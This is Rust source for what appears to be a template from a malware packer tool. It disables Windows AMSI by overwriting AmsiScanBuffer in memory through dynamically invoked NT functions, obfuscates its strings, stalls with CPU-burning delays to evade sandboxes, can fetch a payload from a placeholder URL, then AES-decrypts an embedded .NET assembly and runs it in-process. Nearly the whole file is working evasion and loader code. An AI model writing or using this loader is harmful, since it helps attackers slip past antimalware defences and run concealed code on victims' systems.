#![allow(unused_imports, unused_mut)]
use std::{env, ffi::c_void, ptr};
use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
use bytes::{BytesMut, BufMut};
use clroxide::clr::Clr;
use futures_util::StreamExt;
use windows::Win32::{Foundation::HANDLE, System::Threading::GetCurrentProcess};
use litcrypt::{use_litcrypt, lc};

//AES_START
fn decrypt_aes(buf: &mut Vec<u8>) {

    let key: [u8; 16] = [SYNPACK_KEY];
    let iv: [u8; 16]  = [SYNPACK_IV];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}
//AES_END

fn time_delay(base: f64) -> bool {
    let mut result: f64 = 0.0;
    let mut i: f64 = base.powf(7.0);

    while i >= 0.0 {
        result = result + i.atan() * i.tan();
        i = i - 1.0;
    }
    return true;
}

//WEB_START
async fn get_data() -> Vec<u8> {
    let url: &str = "SYNPACK_URL";
    let mut stream = reqwest::get(url).await.unwrap().bytes_stream();

    let mut buf: BytesMut = BytesMut::new();

    while let Some(bytes) = stream.next().await {
        buf.put(bytes.unwrap());
    }
    return buf.to_vec();
}
//WEB_END

fn mscoree_loader() -> Result<isize, String> {
    let lib: isize = dinvoke::load_library_a("mscoree.dll");

    if lib == 0 {
        return Err("Error".into());
    }

    let func_addr: isize = dinvoke::get_function_address(lib, "CreateInterface");

    if func_addr == 0 {
        return Err("Error".into());
    }

    Ok(func_addr)
}

fn breakpoint() {
    println!("BP HIT");
    let mut buf = String::new();
    let foo = std::io::stdin().read_line(&mut buf);
}

fn amsi_patch() {

    println!("{}", lc!("[+] Patching AMSI"));
    let kernel32_addr: isize = dinvoke::load_library_a(&lc!("kernel32.dll"));
    let amsi_addr: isize = dinvoke::load_library_a(&lc!("amsi.dll"));

    if kernel32_addr == 0 || amsi_addr == 0 {
        println!("Couldn't load needed libraries");
        return;
    }

    let amsi_scan_buffer: isize = dinvoke::get_function_address(amsi_addr, &lc!("AmsiScanBuffer"));

    let ntdll: isize = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
    if ntdll != 0 {
        unsafe {
            let mut ret: Option<i32>;
            let mut ptr_nt_protect_virtual_memory: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
            let current_process: HANDLE = GetCurrentProcess();
            let mut base_addr: *mut c_void = amsi_scan_buffer as *mut c_void;
            let mut bytes_protect_num: usize = 6;
            let page_readwrite: u32 = 0x04;
            let mut old_protect: u32 = 0;
            dinvoke::dynamic_invoke!(ntdll, &lc!("NtProtectVirtualMemory"), ptr_nt_protect_virtual_memory, ret, current_process, &mut base_addr, &mut bytes_protect_num, page_readwrite, &mut old_protect);
            let mut status = ret.unwrap() as u32;

            if status != 0 {
                println!("[!] Error changing protections!! {:?}", status);
                return;
            }

            base_addr = amsi_scan_buffer as *mut c_void;

            let mut fix: Vec<u8> = vec![0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
            let mut bytes_written: usize = 0;
            let ptr_nt_write_virtual_memory: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
            dinvoke::dynamic_invoke!(ntdll, &lc!("NtWriteVirtualMemory"), ptr_nt_write_virtual_memory, ret, current_process, base_addr, fix.as_mut_ptr() as *mut c_void, 6, &mut bytes_written);
            status = ret.unwrap() as u32;

            if status != 0 {
                println!("[!] Error writing memory!! {:?}", status);
                return;
            }

            let mut adj: u32 = 0;
            dinvoke::dynamic_invoke!(ntdll, &lc!("NtProtectVirtualMemory"), ptr_nt_protect_virtual_memory, ret, current_process, &mut base_addr, &mut bytes_protect_num, old_protect, &mut adj);
            status = ret.unwrap() as u32;

            if status != 0 {
                println!("[!] Error writing memory!! {:?}", status);
                return;
            }
        }
    }

}


use_litcrypt!();

#[tokio::main]
async fn main() {
    time_delay(12.0);
    amsi_patch();

    let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];

    let mut args: Vec<String> = vec![SYNPACK_ARGS];

    if args.len() == 0 {
        let mut cmd_args: Vec<String> = env::args().collect();
        cmd_args.remove(0);
        args = cmd_args;
    }
    
    decrypt_aes(&mut bin_data);
    time_delay(8.0);
    let mut clr: Clr = Clr::new(bin_data, args, mscoree_loader).unwrap();

    time_delay(5.0);
    let result: String = clr.run().unwrap();

    println!("{}", result);
}